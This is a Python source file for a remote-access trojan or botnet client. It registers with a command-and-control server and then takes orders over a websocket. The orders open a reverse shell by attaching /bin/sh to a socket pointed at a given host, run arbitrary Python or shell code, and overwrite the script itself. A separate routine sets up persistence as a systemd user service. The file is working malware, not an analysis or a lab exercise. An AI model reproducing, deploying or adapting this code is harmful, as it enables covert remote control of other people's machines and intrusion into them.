#!/usr/bin/env python3

import os
import subprocess
import pickle
import time
import sys
import json
import urllib.request, urllib.parse
import traceback
import socket
import asyncio

try:
	from websockets.asyncio.client import connect
except:
	subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "websockets"])
	os.execv(sys.executable, [sys.executable] + sys.argv)

script_path = os.path.abspath(__file__)
state_path = script_path + ".pkl"

# --- State ---
state = {
	"uid": None,
	"persistence": False,
	"version": 1,
	"servers": ["127.0.0.1:8000"],
}

def load_state():
	global state
	if os.path.isfile(state_path):
		with open(state_path, "rb") as f:
			state = pickle.load(f)

def save_state():
	with open(state_path, "wb") as f:
		pickle.dump(state,f)


# --- Persistence ---
SERVICE_CONFIG = """[Unit]
After=network.target

[Service]
ExecStart={}
Restart=always

[Install]
WantedBy=default.target
"""

def setup_persistence():
	state["persistence"] = True
	save_state()

	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
	service_name = f"{state['uid']}.service"
	service_path = os.path.join(sysd_dir, service_name)

	os.makedirs(sysd_dir, exist_ok=True)
	with open(service_path, "w") as f:
		f.write(SERVICE_CONFIG.format(script_path)) # TODO: include sys.executable in case __file__ isn't executable

	subprocess.run(["systemctl", "--user", "enable", service_name])
	subprocess.run(["systemctl", "--user", "start", service_name])

	exit()

def remove_persistence():
	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
	service_name = f"{state['uid']}.service"
	service_path = os.path.join(sysd_dir, service_name)

	subprocess.run(["systemctl", "--user", "disable", service_name])
	os.remove(service_path)
	state["persistence"] = False

# --- Utility ---
async def log(websocket, data):
	o = {"event":"log", "uid": state.uid, "data":data}
	await websocket.send(json.dumps(o))

async def main():
	while True:
		time.sleep(1)

		if not state["uid"]:
			for server in state["servers"]:
				try:
					with urllib.request.urlopen(f"http://{server}/machines/api/{state['version']}/register/") as response:
						if response.code != 200: continue
						state["uid"] = json.loads(response.read().decode())
						# setup_persistence()
						save_state()
					break
				except Exception as e:
					print(e)
					pass
		
		for server in state["servers"]:
			try:
				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
					print("Joined")
					# websocket.send()
					while True:
						text = await websocket.recv()
						data = json.loads(text)
						if data["event"] == "order":
							for c in data["orders"]:
								match c["name"]:
									case "shell":
										s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
										s.connect((c["server"],c["port"]))
										subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
									case "python":
										# tmp = sys.stdout
										# sys.stdout = io.StringIO()
										try: exec(c["code"])
										except: traceback.print_exc()#log(traceback.format_exc())
										# out = sys.stdout.getvalue()
										# if out:
											# log(sys.stdout.getvalue())
										# sys.stdout = tmp
									case "run":
										subprocess.Popen(c["code"],shell=True)
									case "update":
										with open(script_path, "w") as f:
											f.write(c["code"])
					break
			except KeyboardInterrupt:
				break
			except:
				print(traceback.format_exc())

	save_state()

if __name__ == "__main__":
	load_state()
	asyncio.run(main())